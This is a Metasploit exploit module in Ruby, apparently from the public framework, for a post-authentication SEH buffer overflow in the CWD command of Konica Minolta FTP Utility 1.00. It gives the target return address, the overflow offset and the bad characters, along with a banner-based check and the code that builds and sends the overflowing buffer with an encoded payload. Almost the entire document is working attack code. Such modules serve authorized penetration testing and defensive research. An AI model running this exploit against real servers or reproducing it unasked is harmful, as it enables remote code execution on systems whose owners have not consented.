# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow&#039;,
      &#039;Description&#039; => %q{
          This module exploits an SEH overflow in Konica Minolta FTP Server 1.00.
        Konica Minolta FTP fails to check input size when parsing &#039;CWD&#039; commands, which
        leads to an SEH overflow.  Konica FTP allows anonymous access by default; valid
        credentials are typically unnecessary to exploit this vulnerability.
      },
      &#039;Author&#039; =>
        [
          &#039;Shankar Damodaran&#039;, # stack buffer overflow dos p.o.c
          &#039;Muhamad Fadzil Ramli <mind1355[at]gmail.com>&#039; # seh overflow, metasploit module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [ &#039;EBD&#039;, &#039;37908&#039; ]
        ],
      &#039;Privileged&#039; => false,
      &#039;Payload&#039; =>
        {
          &#039;Space&#039; => 1500,
          &#039;BadChars&#039; => "\x00\x0a\x2f\x5c",
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Targets&#039; =>
        [
          [
            &#039;Windows 7 SP1 x86&#039;,
            {
              &#039;Ret&#039; => 0x12206d9d, # ppr - KMFtpCM.dll
              &#039;Offset&#039; => 1037
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 23 2015&#039;,
      &#039;DefaultTarget&#039; => 0))
  end

  def check
    connect
    disconnect

    if banner =~ /FTP Utility FTP server \(Version 1\.00\)/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect_login

    buf = rand_text(target[&#039;Offset&#039;])
    buf << generate_seh_record(target.ret)
    buf << payload.encoded
    buf << rand_text(3000)

    print_status("Sending exploit buffer...")
    send_cmd([&#039;CWD&#039;, buf], false) # this will automatically put a space between &#039;CWD&#039; and our attack string

    handler
    disconnect
  end
end

